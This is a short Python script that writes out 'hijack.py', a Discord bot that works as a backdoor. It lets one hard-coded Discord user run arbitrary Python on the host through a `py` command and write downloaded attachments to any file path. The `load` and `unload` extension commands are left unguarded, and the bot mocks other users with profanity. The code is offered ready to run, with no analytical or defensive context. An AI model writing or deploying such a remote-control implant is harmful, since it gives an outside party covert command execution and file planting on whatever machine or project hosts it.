open('hijack.py','w').write(f'''
import subprocess, requests, os
from discord.ext import commands

bot = commands.Bot('')

async def owner(ctx):
	check =  ctx.author.id == 394771663155101727
	if not check: await ctx.send('I only work for my master so... ||fuck off||')
	return check

@bot.command()
@commands.check(owner)
async def py(ctx, *, code):
	open('inp.py','w').write(code)
	subprocess.run(
		args=['python', 'inp.py'],
		stdout=open('outp','w'),
		stderr=subprocess.STDOUT,
		timeout=30)
	x, log = 2000, open('outp').read()
	chunks = [log[y-x:y] for y in range(x, len(log)+x, x)]
	for chunk in chunks: await ctx.send(chunk)
	subprocess.run(['rm','inp.py','outp'])

class Authorize(commands.Cog):
	def __init__(self, bot):
		self.bot = bot

	@commands.command()
	async def load(self, ctx, ext):
		bot.load_extension(ext)

	@commands.command()
	async def unload(self, ctx, ext):
		bot.unload_extension(ext)

	@commands.command(aliases=['upload'])
	@commands.check(owner)
	async def uploadfile(self, ctx, path):
		code = requests.get(ctx.message.attachments[0].url).text
		open(path, 'w').write(code)

	@commands.command()
	@commands.check(owner)
	async def shutdown(self, ctx):
		await ctx.send('shutdown')
		exit()

	@commands.Cog.listener()
	async def on_command_error(self, ctx, error):
		if isinstance(error, commands.CommandNotFound): return
		if isinstance(error, commands.CheckFailure): return
		await ctx.send(error)

bot.add_cog(Authorize(bot))

bot.run(os.getenv('TOKEN'))
''')
